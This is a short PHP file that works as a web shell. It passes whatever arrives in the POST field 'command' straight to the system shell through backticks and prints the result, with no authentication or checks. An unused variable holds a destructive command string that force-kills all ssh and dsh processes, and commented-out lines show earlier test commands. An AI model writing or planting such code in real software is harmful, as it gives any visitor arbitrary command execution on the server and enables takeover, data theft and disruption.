
<?php

//system("ls");
//$command = "echo getting ready to exec";
//$output = `$command; sleep 10 && cat run.sh; $command; echo $done;`;
//echo "<pre>$output</pre>";
$command2 = "echo doing good; killall -9 dsh; echo killed dsh; killall -9 ssh; echo killed ssh";
$output2 = $_POST["command"] ;
$output3 = `$output2`;
echo "<pre>$output3</pre>";

?>

